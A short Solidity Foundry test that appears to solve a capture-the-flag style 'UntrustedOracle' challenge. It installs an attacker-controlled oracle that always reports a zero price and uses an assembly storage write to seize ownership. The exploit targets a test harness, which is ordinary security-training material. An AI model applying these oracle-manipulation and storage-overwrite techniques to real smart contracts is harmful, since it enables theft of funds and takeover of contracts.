// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {UntrustedOracleBaseTest} from "./UntrustedOracleBase.t.sol";

contract UntrustedOracleTest is UntrustedOracleBaseTest {
    
    address public new_oracle;

    function testExploit() external validation {

        new_oracle = address(this);
        vm.startPrank(owner);
        oracle.setOracle0(new_oracle);
        vm.stopPrank();
        oracle.setOracle0Price(0);
        
    }

    function setOraclePrice(uint256 _price) external {
        address newOwner = msg.sender;
        assembly {
            sstore(3, newOwner)
        }
    }

    function getOraclePrice() external view returns (uint256) {
        return 0;
    }

    fallback() external payable {
        
    }
}

